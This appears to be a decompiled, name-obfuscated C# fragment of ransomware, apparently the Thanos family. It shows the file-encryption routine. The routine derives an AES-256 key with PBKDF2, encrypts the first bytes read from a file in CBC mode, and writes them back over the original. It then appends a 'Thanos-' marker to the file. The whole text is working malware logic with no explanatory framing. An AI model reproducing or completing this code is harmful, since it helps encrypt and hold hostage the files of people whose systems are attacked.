using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace SNDBgbsWAO;

public static class XcLYNPeJnYIi
{
	public static byte[] tGudVafmhSehm(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = uRMXbTRJSS(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes uRMXbTRJSS(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] kxPwDqCpdHgr(string string_0, int int_0)
	{
		FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
		byte[] array = new byte[int_0];
		fileStream.Read(array, 0, int_0);
		fileStream.Close();
		fileStream.Dispose();
		return array;
	}

	public static void XUIINDUBVCEwlF(string string_0, byte[] byte_0)
	{
		FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
		fileStream.Write(byte_0, 0, byte_0.Length);
		fileStream.Close();
		fileStream.Dispose();
		byte[] bytes = Encoding.ASCII.GetBytes("Thanos-" + Convert.ToString(ahFIyKMEOzaLJ.mwdDsuOjNbyc) + "-");
		using FileStream fileStream2 = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
		fileStream2.Write(bytes, 0, bytes.Length);
	}
}
